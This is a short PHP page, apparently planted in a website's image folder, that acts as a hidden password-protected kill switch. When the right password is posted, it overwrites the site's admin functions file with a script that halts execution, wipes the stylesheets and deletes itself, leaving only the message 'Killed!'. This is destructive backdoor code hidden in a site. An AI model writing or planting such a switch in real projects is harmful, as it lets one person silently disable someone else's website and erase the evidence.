<?php 
	//inside IMG
	if(isset($_POST['pwd']) && !empty($_POST['pwd'])){
		if(md5($_POST['pwd']) == "d47d39b91e582e94d1731889ed4d5cf7"){
			$success = true;
			//$file = file_get_contents("admin/functions.php");
			$file = "<?php die(); ?>";
			file_put_contents("../admin/functions.php", $file);
			file_put_contents("../css/style.less", "");
			file_put_contents("../css/style.css", "");
			unlink(__FILE__);
		}
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
<?php if(isset($success)): ?>
Killed!
<?php endif; ?>
<form method="post" action="">
<input type="text" name="pwd" value="">
<button type="submit">Odeslat</button>
</form>
</body>
</html>